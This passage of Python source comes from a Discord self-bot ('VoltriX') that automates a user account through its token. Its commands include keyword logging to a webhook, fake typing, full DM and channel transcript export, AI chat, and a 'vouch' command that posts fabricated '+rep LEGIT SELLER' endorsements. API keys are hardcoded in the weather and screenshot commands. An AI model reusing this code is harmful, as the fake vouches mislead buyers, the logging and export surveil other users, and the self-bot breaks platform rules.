            f"> `+keyword list` — list all keywords\n"
            f"> `+keyword clear` — remove all keywords"
        )
        await send(ctx, "🔍 Keyword Logger", msg)

    @keyword.group(name="logging", invoke_without_command=True)
    async def keyword_logging(self, ctx):
        await ctx.message.delete()
        status = "enabled" if keyword_logger_enabled else "disabled"
        await send(ctx, "🔍 Keyword Logger", f"Keyword logger is currently **{status}**. Use `+keyword logging enable` or `+keyword logging disable`.")

    @keyword_logging.command(name="enable")
    async def keyword_logging_enable(self, ctx):
        global keyword_logger_enabled
        await ctx.message.delete()
        keyword_logger_enabled = True
        config["keyword_logger_enabled"] = True
        save_config()
        await send(ctx, "🔍 Keyword Logger", "✅ Keyword logger has been **enabled**.")

    @keyword_logging.command(name="disable")
    async def keyword_logging_disable(self, ctx):
        global keyword_logger_enabled
        await ctx.message.delete()
        keyword_logger_enabled = False
        config["keyword_logger_enabled"] = False
        save_config()
        await send(ctx, "🔍 Keyword Logger", "❌ Keyword logger has been **disabled**.")

    @keyword.command(name="webhook")
    async def keyword_webhook(self, ctx, url: str):
        global keyword_logger_webhook
        await ctx.message.delete()
        if not url.startswith("https://discord.com/api/webhooks/") and not url.startswith("https://discordapp.com/api/webhooks/"):
            await senderror(ctx, "Keyword Logger", "❌ Invalid webhook URL. Must be a valid Discord webhook.")
            return
        keyword_logger_webhook = url
        config["keyword_logger_webhook"] = url
        save_config()
        await send(ctx, "🔍 Keyword Logger", f"✅ Webhook URL has been set successfully.")

    @keyword.command(name="add")
    async def keyword_add(self, ctx, *, word: str):
        global keyword_logger_keywords
        await ctx.message.delete()
        word = word.lower().strip()
        if not word:
            await senderror(ctx, "Keyword Logger", "❌ Please provide a keyword to add.")
            return
        if word in [k.lower() for k in keyword_logger_keywords]:
            await send(ctx, "🔍 Keyword Logger", f"⚠️ Keyword `{word}` is already in the list.")
            return
        keyword_logger_keywords.append(word)
        config["keyword_logger_keywords"] = keyword_logger_keywords
        save_config()
        await send(ctx, "🔍 Keyword Logger", f"✅ Added keyword `{word}`. Total: `{len(keyword_logger_keywords)}`")

    @keyword.command(name="remove")
    async def keyword_remove(self, ctx, *, word: str):
        global keyword_logger_keywords
        await ctx.message.delete()
        word = word.lower().strip()
        lower_list = [k.lower() for k in keyword_logger_keywords]
        if word not in lower_list:
            await senderror(ctx, "Keyword Logger", f"❌ Keyword `{word}` not found in the list.")
            return
        idx = lower_list.index(word)
        keyword_logger_keywords.pop(idx)
        config["keyword_logger_keywords"] = keyword_logger_keywords
        save_config()
        await send(ctx, "🔍 Keyword Logger", f"🗑️ Removed keyword `{word}`. Remaining: `{len(keyword_logger_keywords)}`")

    @keyword.command(name="list")
    async def keyword_list(self, ctx):
        await ctx.message.delete()
        if not keyword_logger_keywords:
            await send(ctx, "🔍 Keyword Logger — List", "📭 No keywords configured yet.\nUse `+keyword add <word>` to add one.")
            return
        kw_lines = "\n".join(f"`{i+1}.` {kw}" for i, kw in enumerate(keyword_logger_keywords))
        await send(ctx, f"🔍 Keyword Logger — {len(keyword_logger_keywords)} Keyword(s)", kw_lines)

    @keyword.command(name="clear")
    async def keyword_clear(self, ctx):
        global keyword_logger_keywords
        await ctx.message.delete()
        count = len(keyword_logger_keywords)
        keyword_logger_keywords.clear()
        config["keyword_logger_keywords"] = []
        save_config()
        await send(ctx, "🔍 Keyword Logger", f"🔁 All `{count}` keywords have been cleared.")

    @commands.command()
    async def tts(self, ctx, *, message):
        """Convert text to speech."""
        await ctx.message.delete()
        buff = await self.do_tts(message)
        await ctx.send(file=discord.File(buff, f"voltrix.mp3"))

    @commands.command(aliases=['others'])
    async def other(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description1 = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<a:exc:1325375984509128754> | **Text to speech** **:** **`{prefix}tts [message]`**\n"
            f"<a:exc:1325375984509128754> | **Create a server** **:** **`{prefix}crsrv <name>`**\n"           
            f"<a:exc:1325375984509128754> | **Get Screenshot** **:** **`{prefix}screenshot [website]`**\n"
            f"<a:exc:1325375984509128754> | **custom Qr code** **:** **`{prefix}qrcode [input]`**\n"
            f"<a:exc:1325375984509128754> | **Fake typing** **:** **`{prefix}faketyping`**\n"
            f"<a:exc:1325375984509128754> | **Stop Fake typing** **:** **`{prefix}stoptyping`**\n"
            f"<a:exc:1325375984509128754> | **Shiba profile** **:** **`{prefix}p [user]`**\n"
            f"<a:exc:1325375984509128754> | **Make vouch text** **:** **`{prefix}vouch`**\n"
            f"<a:exc:1325375984509128754> | **Chat-gpt** **:** **`{prefix}chatgpt <prompt>`**\n"
            f"<a:exc:1325375984509128754> | **Chat Transcript** **:** **`{prefix}transcript <id>`**\n"
            f"<a:exc:1325375984509128754> | **Math solver** **:** **`{prefix}math [equation]`**\n"
            f"<a:exc:1325375984509128754> | **Vanity Checker** **:** **`{prefix}vanity_check [vanity]`**\n"
            f"<a:exc:1325375984509128754> | **Check Weather** **:** **`{prefix}weather [city]`**\n"
            f"<a:exc:1325375984509128754> | **Wiki Search** **:** **`{prefix}wiki [query]`**\n"
            f"<a:exc:1325375984509128754> | **UNIX Timestamp** **:** **`{prefix}timestamp <datetime>`**\n"
            f"<a:exc:1325375984509128754> | **Find entity** **:** **`{prefix}find [query]`**\n"
            f"<a:exc:1325375984509128754> | **View message** **:** **`{prefix}view [msg_id]`**\n"
            f"<a:exc:1325375984509128754> | **Leave all servers** **:** **`{prefix}leaveallservers`**\n"
            f"<a:exc:1325375984509128754> | **Text to Binary** **:** **`{prefix}binary [text]`**\n"
            f"<a:exc:1325375984509128754> | **Binary to Text** **:** **`{prefix}unbinary [binary]`**\n"
            f"<a:exc:1325375984509128754> | **Block user** **:** **`{prefix}block [user]`**\n"
            f"<a:exc:1325375984509128754> | **Unblock user** **:** **`{prefix}unblock [user]`**\n"
            f"<a:exc:1325375984509128754> | **Blocklist** **:** **`{prefix}blocklist`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Other Commands Page 1__<:Titanz:1281243489635405827>",  description1)

        description2 = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<a:exc:1325375984509128754> | **Send sc Msg** **:** **`{prefix}sc [cat_id] [msg]`**\n"
            f"<a:exc:1325375984509128754> | **Stop sc Msg** **:** **`{prefix}stopsc [cat_id]`**\n"
            f"<a:exc:1325375984509128754> | **Pause sc Msg** **:** **`{prefix}pausesc [cat_id]`**\n"
            f"<a:exc:1325375984509128754> | **Resume sc Msg** **:** **`{prefix}resumesc [cat_id]`**\n"
            f"<a:exc:1325375984509128754> | **Clear sc Msg** **:** **`{prefix}clearsc [cat_id]`**\n"
            f"<a:exc:1325375984509128754> | **Delay sc Msg** **:** **`{prefix}delaysc [cat_id] [seconds]`**\n"
            f"<a:exc:1325375984509128754> | **Edit sc Msg** **:** **`{prefix}editsc [cat_id] [new_msg]`**\n"
            f"<a:exc:1325375984509128754> | **List sc Tasks** **:** **`{prefix}listsc`**\n"
            f"<a:exc:1325375984509128754> | **Lock Group Leave** **:** **`{prefix}noleave [user]`**\n"
            f"<a:exc:1325375984509128754> | **Unlock Group Leave** **:** **`{prefix}allowleave [user]`**\n"
            f"<a:exc:1325375984509128754> | **Add Auto-Forward** **:** **`{prefix}af [trigger], [msg_id] <chan_id>`**\n"
            f"<a:exc:1325375984509128754> | **Remove Auto-Forward** **:** **`{prefix}afrem [trigger]`**\n"
            f"<a:exc:1325375984509128754> | **Reset Auto-Forward** **:** **`{prefix}afreset`**\n"
            f"<a:exc:1325375984509128754> | **List Auto-Forward** **:** **`{prefix}aflist`**\n"
            f"<a:exc:1325375984509128754> | **Mutual Servers** **:** **`{prefix}mutualservers [user]`**\n"
            f"<a:exc:1325375984509128754> | **Add AutoResponse** **:** **`{prefix}ar [trigger], [response]`**\n"
            f"<a:exc:1325375984509128754> | **Delete AutoResponse** **:** **`{prefix}removear [trigger]`**\n"
            f"<a:exc:1325375984509128754> | **List AutoResponses** **:** **`{prefix}ar_list`**\n"
            f"<a:exc:1325375984509128754> | **Scan Nicknames** **:** **`{prefix}nickscan`**\n"
            f"<a:exc:1325375984509128754> | **Reset Nicknames** **:** **`{prefix}nickreset`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Other Commands Page 2__<:Titanz:1281243489635405827>",  description2)



    @commands.command(name='math')
    async def math(self, ctx, *, equation):
        """Calculate the result of a given math equation."""
        await ctx.message.delete()
        api_endpoint = 'https://api.mathjs.org/v4/'
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_endpoint, params={'expr': equation}) as response:
                    if response.status == 200:
                        result = (await response.text()).strip()
                        response_message = (
                            f"# **__CALCULATOR__** <:calculator:1322954645387350116>\n"
                            f"<:note:1290693795763195945> **EQUATION**: `{equation}`\n"
                            f"<:arrow_blue:1281246700358471722> **Result**:\n"
                            f"# <:white_arrow:1290693789824061461>{result}"
                        )
                        await ctx.send(response_message)
                    else:
                        await ctx.send('<:lr_tick_1:1290693800808677461> **Failed to calculate the equation.**')
        except Exception as e:
            await ctx.send(f"<:lr_tick_1:1290693800808677461> **An error occurred:** `{str(e)}`")

    @commands.command(name="vanity_check", aliases=["vanitycheck"])
    async def vanity_check(self, ctx, url: str):
        """Checks if a vanity URL is available and gives server info if it exists."""
        await ctx.message.delete()
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(f"https://discord.com/api/v10/invites/{url}") as response:
                    if response.status == 200:
                        data = await response.json()
                        server_info = data.get('guild', {})

                        if server_info:
                            server_name = server_info.get('name', 'Unknown Server')
                            server_id = server_info.get('id', 'Unknown ID')
                            owner_id = server_info.get('owner_id', 'Unknown Owner')
                            server_region = server_info.get('region', 'Unknown Region')
                            icon_url = server_info.get('icon', 'No Icon')
                            if icon_url:
                                icon_url = f"https://cdn.discordapp.com/icons/{server_id}/{icon_url}.png"
                            else:
                                icon_url = "No Icon"

                            await ctx.send(f"Vanity URL: discord.gg/{url} exists!\n"
                                           f"Server Name: {server_name}\n"
                                           f"Server ID: {server_id}\n"
                                           f"Owner ID: {owner_id}\n"
                                           f"Server Region: {server_region}\n"
                                           f"Server Icon: {icon_url}")
                        else:
                            await ctx.send(f"Vanity URL: discord.gg/{url} is available!")
                    else:
                        await ctx.send(f"Vanity URL discord.gg/{url} does not exist.")
            except Exception as e:
                await ctx.send(f"Error checking vanity URL: {e}")

    @commands.command()
    async def weather(self, ctx, *, city: str):
        """Get weather updates for a city."""
        await ctx.message.delete()
        openweather_api_key = "e50ebe27f9b5ce6fc9aeb309cba27700"
        url = f"http://api.openweathermap.org/data/2.5/weather?q={city}&appid={openweather_api_key}&units=metric"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        description = data['weather'][0]['description']
                        temp = data['main']['temp']
                        humidity = data['main']['humidity']
                        wind_speed = data['wind']['speed']
                        await ctx.send(f"**Weather in {city.title()}**:\n"
                                       f"🌡️ Temperature: {temp}°C\n"
                                       f"☁️ Description: {description.capitalize()}\n"
                                       f"💧 Humidity: {humidity}%\n"
                                       f"🌬️ Wind Speed: {wind_speed} m/s")
                    else:
                        await ctx.send("City not found or API error!")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

    @commands.command(name="ar")
    async def ar(self, ctx, *, trigger_and_response: str):
        """Add an auto response trigger and response, separated by a comma."""
        await ctx.message.delete()
        if ',' not in trigger_and_response:
            return await senderror(ctx, "Invalid Format", "❌ Use: `.ar <trigger>, <response>`")
            
        trigger, response = map(str.strip, trigger_and_response.split(',', 1))

        try:
            if os.path.exists('database/ar.json'):
                with open('database/ar.json', 'r', encoding='utf-8') as file:
                    data = json.load(file)
            else:
                data = {}
        except:
            data = {}

        data[trigger] = response

        with open('database/ar.json', 'w', encoding='utf-8') as file:
            json.dump(data, file, indent=4)

        await send(ctx, "Auto Response Added", f"<:lr_tick_1:1290693800808677461> **Auto Response Added!**\n\n**Trigger:** `{trigger}`\n**Response:** `{response}`")
        print("[+] AUTO RESPOND ADDED")

    @commands.command(name="removear", aliases=["delar"])
    async def removear(self, ctx, *, trigger: str):
        """Remove an auto response trigger."""
        await ctx.message.delete()
        try:
            if os.path.exists('database/ar.json'):
                with open('database/ar.json', 'r', encoding='utf-8') as file:
                    data = json.load(file)
            else:
                data = {}
        except:
            data = {}

        if trigger in data:
            del data[trigger]

            with open('database/ar.json', 'w', encoding='utf-8') as file:
                json.dump(data, file, indent=4)

            await send(ctx, "Auto Response Removed", f"<:lr_tick_1:1290693800808677461> **Auto Response Removed:** `{trigger}`")
            print("[+] AUTO RESPOND REMOVED")
        else:
            await senderror(ctx, "Not Found", f"❌ Trigger `{trigger}` not found in auto responder.")

    @commands.command(name="ar_list", aliases=["arlis", "arlist"])
    async def ar_list(self, ctx):
        """List all auto response triggers and responses."""
        await ctx.message.delete()
        try:
            if os.path.exists("database/ar.json"):
                with open("database/ar.json", "r", encoding="utf-8") as f:
                    data = json.load(f)
            else:
                data = {}
        except:
            data = {}

        if not data:
            return await send(ctx, "Auto Response List", "<:CROSS_TDG:1321149916201881683> **No auto responder triggers found.**")

        message = ""
        for trigger, response in data.items():
            message += f"<:white_arrow:1290693789824061461> **Trigger:** `{trigger}` ➔ **Response:** `{response}`\n"

        await send(ctx, "Auto Response Triggers List", message)
        print("[+] ar_list Command Used")

    @commands.command(aliases=['ss', 'takess', 'showss'])
    async def screenshot(self, ctx, url):
        await ctx.message.delete()
        voltrixkeyss = 'c0a417'
        endpoint = 'https://api.screenshotmachine.com'
        params = {
            'key': voltrixkeyss,
            'url': url,
            'dimension': '1920x1080', 
            'format': 'png',
            'cacheLimit': '0',
            'timeout': '200'
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint, params=params) as response:
                    if response.status == 200:
                        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
                        temp_file.write(await response.read())
                        temp_file.close()
                        await ctx.send(file=discord.File(temp_file.name))
                        os.remove(temp_file.name)
                    else:
                        await ctx.send(f"Failed to capture screenshot: {response.status}",delete_after=30)
        except Exception as e:
            await ctx.send(f"An error occurred: {str(e)}")       

    @commands.command(aliases=['qr'])
    async def qrcode(self, ctx, input: str):
        await ctx.message.delete()
        try:
            qr = qrcode.QRCode(
                version=1,
                box_size=10, 
                border=5,
            )
            qr.add_data(input)
            qr.make(fit=True)
        
            img = qr.make_image(fill="black", back_color="white")
        
            buffer = BytesIO()
            img.save(buffer, format="PNG")
            buffer.seek(0)
            
            file = discord.File(buffer, filename="ltc_qr.png")
            await ctx.send(content=f"<:white_arrow:1290693789824061461>  **Here is the QR code for `{input}`**", file=file)
        
        except Exception as e:
            await ctx.send(f"An error occurred while generating the QR code: {e}")

    async def simulate_typing(self, channel_id):
        token = self.bot.http.token
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }

        async with aiohttp.ClientSession(headers=headers) as session:
            while self.typing_task is not None:
                try:
                    async with session.post(f"{self.api_base_url}/channels/{channel_id}/typing") as response:
                        if response.status == 204:
                            pass  # Typing event triggered successfully
                        else:
                            print(f"Failed to fake typing: {response.status}")
                    await asyncio.sleep(5)  # Delay before typing again
                except Exception as e:
                    print(f"Error while simulating typing: {e}")
                    break

    @commands.command()
    async def faketyping(self, ctx):
        await ctx.message.delete()        
        if self.typing_task:
            await ctx.send("<:white_arrow:1290693789824061461> Typing is already simulated.")
            return
        self.typing_task = asyncio.create_task(self.simulate_typing(ctx.channel.id))

    @commands.command()
    async def stoptyping(self, ctx):
        await ctx.message.delete()
        if self.typing_task:
            self.typing_task.cancel()
            self.typing_task = None
            await ctx.send("<:white_arrow:1290693789824061461> Stopped simulating typing.")
        else:
            await ctx.send("<:white_arrow:1290693789824061461> No typing simulation is running.")

    @commands.command()
    async def vouch(self,ctx,payment_method: str ,price_with_currency,*,product_with_quantity):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        vouch_server = config.get("vouch_server")        
        await ctx.send(f"+rep {ctx.author.id} | LEGIT SELLER | GOT {product_with_quantity} for {price_with_currency} {payment_method} • TYSM")
        await ctx.send(vouch_server)    

    async def _fetch_groq(self, session: aiohttp.ClientSession, prompt: str) -> str:
        url = "https://api.groq.com/openai/v1/chat/completions"
        headers = {
            "Authorization": f"Bearer {GROQ_API_KEY}",
            "Content-Type": "application/json"
        }
        payload = {
            "model": "llama-3.3-70b-versatile",
            "messages": [
                {"role": "system", "content": "You are a helpful AI assistant inside a Discord bot."},
                {"role": "user", "content": prompt}
            ],
            "max_tokens": 2000,
            "temperature": 0.7
        }

        async with session.post(url, json=payload, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                return data['choices'][0]['message']['content']
            raise Exception(f"Groq API Error ({response.status}): {await response.text()}")

    async def _fetch_gemini(self, session: aiohttp.ClientSession, prompt: str) -> str:
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key={GEMINI_API_KEY}"
        payload = {
            "contents": [
                {
                    "parts": [{"text": prompt}]
                }
            ],
            "generationConfig": {
                "maxOutputTokens": 2000,
                "temperature": 0.7
            }
        }

        async with session.post(url, json=payload) as response:
            if response.status == 200:
                data = await response.json()
                return data['candidates'][0]['content']['parts'][0]['text']
            raise Exception(f"Gemini API Error ({response.status}): {await response.text()}")

    @commands.command(aliases=['gpt'])
    async def chatgpt(self, ctx, *, prompt: str):
        try:
            await ctx.message.delete()
        except Exception:
            pass

        timeout = aiohttp.ClientTimeout(total=30)
        ai_response = None

        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # 1. Attempt Groq first
                if GROQ_API_KEY:
                    try:
                        ai_response = await self._fetch_groq(session, prompt)
                    except Exception:
                        ai_response = None

                # 2. Fallback to Gemini if Groq failed or key was missing
                if not ai_response and GEMINI_API_KEY:
                    try:
                        ai_response = await self._fetch_gemini(session, prompt)
                    except Exception as gemini_err:
                        await ctx.send(f"❌ Gemini Fallback Error: {gemini_err}")
                        return

                if not ai_response:
                    await ctx.send("❌ Failed to get a response from both Groq and Gemini APIs.")
                    return

                # Header and chunking setup for Discord's 2000 character limit
                header_text = (
                    f'<:white_arrow:1290693789824061461> **Prompt** : {prompt}\n'
                    f'<:white_arrow:1290693789824061461> **AI Response** : '
                )

                first_chunk_size = 1900 - len(header_text)
                chunk_size = 1900
                chunks = []

                if len(ai_response) <= first_chunk_size:
                    chunks.append(ai_response)
                else:
                    chunks.append(ai_response[:first_chunk_size])
                    remaining = ai_response[first_chunk_size:]
                    for i in range(0, len(remaining), chunk_size):
                        chunks.append(remaining[i:i + chunk_size])

                # Send initial chunk with prompt header
                await send(ctx, 'AI Assistant', header_text + chunks[0])

                # Send subsequent chunks
                for chunk in chunks[1:]:
                    await send(ctx, 'AI Assistant', chunk)

        except aiohttp.ClientConnectorError:
            await ctx.send('❌ Connection Error: Unable to reach AI servers.')
        except Exception as e:
            await ctx.send(f'❌ An error occurred: {e}')

    @commands.command(name="transcript", aliases=["backupchat", "exportchat"])
    async def transcript(self, ctx, target: str = None):
        try:
            await ctx.message.delete()
        except:
            pass

        target_channel = ctx.channel
        if target:
            try:
                target_id = int(target)
                chan = self.bot.get_channel(target_id)
                if not chan:
                    try:
                        chan = await self.bot.fetch_channel(target_id)
                    except:
                        pass
                
                if chan:
                    target_channel = chan
                else:
                    user = self.bot.get_user(target_id) or await self.bot.fetch_user(target_id)
                    if user:
                        target_channel = user.dm_channel or await user.create_dm()
            except Exception as e:
                await send(ctx, "Transcript Results", f"❌ Invalid ID or unable to resolve channel/user: {e}")
                return

        status_msg = await send(ctx, "Transcript Generator", "⏳ Generating transcript, please wait...")

        # Define FakeGuild class for DM/Group wrapper
        class FakeGuild:
            def __init__(self, bot_user):
                self.id = 0
                self.name = "Direct Message"
                self.icon = None
                self.roles = []
                self.me = bot_user
            def get_member(self, user_id):
                return None
            async def fetch_member(self, user_id):
                return None
            def get_channel(self, channel_id):
                return None
            async def fetch_channel(self, channel_id):
                return None

        # Define ChannelWrapper to allow raw_export to do `channel.guild = guild` and lookup other channel fields
        class ChannelWrapper:
            def __init__(self, original_channel, fake_guild):
                self.__dict__["_original"] = original_channel
                self.__dict__["guild"] = fake_guild
                
            @property
            def name(self):
                orig = self.__dict__["_original"]
                if hasattr(orig, "name") and orig.name:
                    return orig.name
                if hasattr(orig, "recipient") and orig.recipient:
                    return f"DM with {orig.recipient.name}"
                return "Direct Message"

            def __getattr__(self, name):
                return getattr(self.__dict__["_original"], name)
                
            def __setattr__(self, name, value):
                if name in ("_original", "guild"):
                    self.__dict__[name] = value
                else:
                    setattr(self.__dict__["_original"], name, value)

        # Define GenericComponent to represent V2 components if discord.py version doesn't parse them
        class GenericComponent:
            def __init__(self, data):
                self._data = data
                self.id = data.get("id")
                self.spoiler = data.get("spoiler", False)
                self.content = data.get("content", "")
                self.divider = data.get("divider", True)
                self.spacing = data.get("spacing", 1)
                self.accent_color = data.get("accent_color")
                self.accent_colour = self.accent_color
                
                self.children = []
                for child_data in data.get("components", []):
                    self.children.append(GenericComponent(child_data))
                self.components = self.children

                self.items = []
                for item_data in data.get("items", []):
                    self.items.append(GenericComponent(item_data))

                media_data = data.get("media") or data.get("file")
                if media_data:
                    self.media = GenericComponent(media_data)
                    self.file = self.media
                else:
                    self.media = None
                    self.file = None
                    
                self.url = data.get("url", "")
                self.name = data.get("name", "")
                self.description = data.get("description", "")

            @property
            def type(self):
                class MockType:
                    def __init__(self, val):
                        self.value = val
                    def __repr__(self):
                        return str(self.value)
                return MockType(self._data.get("type"))

        # Check if the channel is a DM or Group (guild is None) and wrap it
        fake_guild = None
        if getattr(target_channel, "guild", None) is None:
            fake_guild = FakeGuild(self.bot.user)
            target_channel = ChannelWrapper(target_channel, fake_guild)

        # Monkeypatch discord.components._component_factory to parse V2 components
        import discord.components
        orig_component_factory = discord.components._component_factory

        def patched_component_factory(data, *args, **kwargs):
            try:
                comp_type = data.get("type")
                if comp_type in (9, 10, 11, 12, 13, 14, 17, 18, 19, 21, 22, 23):
                    res = orig_component_factory(data, *args, **kwargs)
                    if res is None:
                        return GenericComponent(data)
                    return res
            except Exception:
                return GenericComponent(data)
            return orig_component_factory(data, *args, **kwargs)

        discord.components._component_factory = patched_component_factory

        # Fetch history after setting up the factory monkeypatch
        messages = []
        try:
            async for message in target_channel.history(limit=None):
                messages.append(message)
        except Exception as e:
            # Restore factory on error
            discord.components._component_factory = orig_component_factory
            if status_msg:
                try:
                    await status_msg.delete()
                except:
                    pass
            await send(ctx, "Transcript Results", f"❌ Failed to fetch channel history: {e}")
            return

        # Monkeypatch message datetimes to be naive UTC datetimes during export
        orig_msg_created_at = discord.Message.created_at
        orig_msg_edited_at = discord.Message.edited_at

        def safe_created_at(self):
            dt = orig_msg_created_at.__get__(self)
            if dt and hasattr(dt, "tzinfo") and dt.tzinfo is not None:
                return dt.replace(tzinfo=None)
            return dt
        discord.Message.created_at = property(safe_created_at)

        def safe_edited_at(self):
            dt = orig_msg_edited_at.__get__(self)
            if dt and hasattr(dt, "tzinfo") and dt.tzinfo is not None:
                return dt.replace(tzinfo=None)
            return dt
        discord.Message.edited_at = property(safe_edited_at)

        try:
            import chat_exporter
            
            transcript_html = await chat_exporter.raw_export(
                channel=target_channel,
                messages=messages,
                bot=self.bot,
                guild=fake_guild
            )
        except Exception as e:
            if status_msg:
                try:
                    await status_msg.delete()
                except:
                    pass
            await send(ctx, "Transcript Results", f"❌ chat_exporter error: {e}")
            return
        finally:
            # Always restore original properties and factory
            discord.Message.created_at = orig_msg_created_at
            discord.Message.edited_at = orig_msg_edited_at
            discord.components._component_factory = orig_component_factory

        if transcript_html is None:
            if status_msg:
                try:
                    await status_msg.delete()
                except:
                    pass
            await send(ctx, "Transcript Results", "❌ Unable to generate transcript.")
            return

        logo_url = "https://cdn.discordapp.com/embed/avatars/0.png"
        
        real_channel = getattr(target_channel, "_original", target_channel)
        channel_name = str(real_channel)
        
        if hasattr(real_channel, "guild") and real_channel.guild:
            if real_channel.guild.icon:
                logo_url = real_channel.guild.icon.url
            channel_name = f"{real_channel.guild.name} — #{real_channel.name}"
        elif hasattr(real_channel, "icon") and real_channel.icon:
            logo_url = real_channel.icon.url
            channel_name = f"Group Chat — {real_channel.name}"
        elif hasattr(real_channel, "recipient") and real_channel.recipient:
            if real_channel.recipient.avatar:
                logo_url = real_channel.recipient.avatar.url
            channel_name = f"DM with {real_channel.recipient.name}"

        gen_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")

        custom_header_html = f"""
        <div style="background-color: #2b2d31; padding: 20px; border-bottom: 2px solid #1e1f22; display: flex; align-items: center; justify-content: space-between; font-family: sans-serif; color: #dbdee1; margin-bottom: 20px;">
            <div style="display: flex; align-items: center; gap: 15px;">
                <img src="{logo_url}" style="width: 50px; height: 50px; border-radius: 50%; object-fit: cover; border: 1px solid #3f4147;">
                <div>
                    <h2 style="margin: 0; font-size: 18px; color: #ffffff;">VoltriX Transcript</h2>
                    <p style="margin: 3px 0 0 0; font-size: 13px; color: #949ba4;">Channel: {channel_name}</p>
                </div>
            </div>
            <div style="font-size: 12px; color: #949ba4; text-align: right;">
                <div>Generated by VoltriX Self-Bot</div>
                <div style="margin-top: 3px; font-weight: bold; color: #00a8fc;">Premium Edition</div>
            </div>
        </div>
        """

        custom_footer_html = f"""
        <div style="background-color: #2b2d31; padding: 15px 20px; border-top: 2px solid #1e1f22; text-align: center; font-family: sans-serif; font-size: 13px; color: #949ba4; margin-top: 30px;">
            <p style="margin: 0;">VoltriX Chat Transcript Exporter • Completed at {gen_time}</p>
        </div>
        """

        if "<body>" in transcript_html:
            transcript_html = transcript_html.replace("<body>", f"<body>\n{custom_header_html}", 1)
        else:
            transcript_html = f"{custom_header_html}\n{transcript_html}"

        if "</body>" in transcript_html:
            transcript_html = transcript_html.replace("</body>", f"{custom_footer_html}\n</body>", 1)
        else:
            transcript_html = f"{transcript_html}\n{custom_footer_html}"

        folder_path = "Database/Transcripts"
        os.makedirs(folder_path, exist_ok=True)
        file_name = f"{getattr(real_channel, 'name', 'chat')}-transcript.html"
        file_path = os.path.join(folder_path, file_name)

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(transcript_html)

        if status_msg:
            try:
                await status_msg.delete()
            except:
                pass

        content_text = (
            f"**Here is your transcript**\n"
            f"> Generated at: {gen_time}\n"
            f"> Channel ID: {real_channel.id}"
        )

        try:
            with open(file_path, "rb") as f:
                await ctx.send(content=content_text, file=discord.File(f, file_name))
        except Exception as e:
            await send(ctx, "Transcript Results", f"❌ Failed to send file: {e}")
        finally:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass

    @commands.command(name="nickscan", description="Sends a list of all the nicknames you have in servers.")
